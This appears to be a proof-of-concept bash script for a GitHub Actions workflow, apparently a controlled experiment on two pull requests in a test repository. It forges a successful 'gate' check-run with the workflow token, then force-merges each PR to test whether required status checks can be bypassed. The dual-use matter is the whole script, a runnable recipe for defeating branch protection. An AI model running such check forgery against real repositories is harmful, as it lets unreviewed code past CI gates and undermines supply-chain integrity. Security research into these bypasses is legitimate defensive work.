#!/usr/bin/env bash
set -uo pipefail
if [ -z "${GITHUB_TOKEN:-}" ]; then
  echo "FG|VOID|GITHUB_TOKEN-EMPTY-IN-ENV - every result below is meaningless"; echo "FG|DONE"; exit 0
fi
echo "FG|EVENT|${GITHUB_EVENT_NAME:-?}|REF|${GITHUB_REF:-?}|RUN|${GITHUB_RUN_ID:-?}"
API=https://api.github.com/repos/kovac-labs/zz-mq-tok-1027
api () { curl -s -o /tmp/o -w '%{http_code}' -X "$1" -H "Authorization: Bearer ${GITHUB_TOKEN}" \
         -H 'Accept: application/vnd.github+json' ${3:+-d "$3"} "$API$2"; }
cell () {   # $1 = label, $2 = PR number, $3 = the pinned app id (for the log only)
  local L="$1" N="$2" PIN="$3" C H
  H=$(api GET "/pulls/${N}"); SHA=$(python3 -c "import json;print(json.load(open('/tmp/o'))['head']['sha'])")
  MS=$(python3 -c "import json;print(json.load(open('/tmp/o'))['mergeable_state'])")
  echo "FG|${L}|PIN=${PIN}|PR=${N}|head=${SHA:0:12}|PRE-mergeable_state=${MS}"
  # the forge: a check-run with the required CONTEXT NAME, created by the github-actions App
  C=$(api POST "/check-runs" "{\"name\":\"gate\",\"head_sha\":\"${SHA}\",\"status\":\"completed\",\"conclusion\":\"success\"}")
  echo "FG|${L}|FORGE-CHECKRUN|http=${C}|app=$(python3 -c "
import json
try:
  d=json.load(open('/tmp/o')); print('%s/%s'%(d['app']['slug'],d['app']['id']))
except Exception as e: print('parse-fail')
")"
  sleep 8
  H=$(api GET "/pulls/${N}"); MS=$(python3 -c "import json;print(json.load(open('/tmp/o'))['mergeable_state'])")
  echo "FG|${L}|POST-FORGE-mergeable_state=${MS}"
  M=$(api PUT "/pulls/${N}/merge" '{"merge_method":"merge"}')
  echo "FG|${L}|MERGE|http=${M}|$(head -c 260 /tmp/o | tr -d '\n')"
}
cell CONTROL-pinned-to-github-actions "$(cat .github/scripts/PR_A)" 15368
cell ARM-pinned-to-THIRD-PARTY-app    "$(cat .github/scripts/PR_B)" 254
echo "FG|DONE"
